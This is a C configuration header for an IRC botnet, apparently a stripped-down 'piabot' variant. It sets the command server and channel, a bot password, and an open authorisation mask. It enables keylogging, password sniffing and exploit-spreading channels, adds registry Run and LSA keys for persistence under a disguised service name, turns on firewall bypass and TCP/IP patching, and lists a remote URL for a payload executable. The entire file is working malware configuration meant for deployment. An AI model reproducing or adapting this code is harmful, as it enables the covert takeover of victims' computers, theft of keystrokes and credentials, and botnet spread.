/*

fukj00, a lame ass stripped piabot...

Removed :
- all shitty exploits
- s4
- findpass
- speedtest
- flood
- ddos
- targa
- wisdom
- udp

  */

#define AU_IP "140.x.x.x" 
#define AU_EXPLOIT "vncs" 

int port = 3921;		
int port2 = 3921;		
int socks4port = 2020;		
int tftpport = 69;		
int ftpport = brandom(1337,65535); 
int httpport = 80;		
int rloginport = 513;		
unsigned short bindport = 1991;		
BOOL topiccmd = TRUE;		
BOOL rndfilename = FALSE;	
BOOL AutoStart = TRUE;		
char prefix = '.';		
int maxrand = 5;		
int nicktype = COUNTRYNICK;	
BOOL nickprefix = TRUE;		

#ifdef DEBUG_LOGGING
char logfile[]="c:\\windows\\system32\\regnfind.ocx";
#endif

#ifndef NO_CRYPT

#else  

char botid[] = "k3y";		
char version[] = "h1d3 PIA";		
char password[] = "10203040";		
char server[] = "kral.bestunix.org";	
char serverpass[] = "";		
char channel[] = "#piavnc";		
char chanpass[] = "";
char server2[] = "";	
char channel2[] = "";		
char chanpass2[] = "";		
char filename[] = "agl23.exe";	
char keylogfile[] = "winnt.bat";		
char valuename[] = "Windows Service Agent";
char nickconst[] = "PwnZ|";		
char szLocalPayloadFile[]="winsys.dat";	
char modeonconn[] = "-x+i";		
char exploitchan[] = "#piavnc#";		
char keylogchan[] = "#piavnc#";		
char psniffchan[] = "#piavnc#";		 

char *authost[] = {
	"*@*",
	
};

char *versionlist[] = {
	"mIRC v6.16 Khaled Mardam-Bey",
	"mIRC v6.17 Khaled Mardam-Bey",
	"mIRC v6.20 Khaled Mardam-Bey",
	"mIRC v6.21 Khaled Mardam-Bey"
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "2poiwsfpf3213ew"; 
#endif

const char partline[] = "."; 
const char floodline[] = ".";

BOOL BypassFW = TRUE;
BOOL PatchTCPIP = TRUE;

#ifndef NO_VNC 
char http[] = "http://www.freewebtown.com/hidex/test.exe"; 
#endif
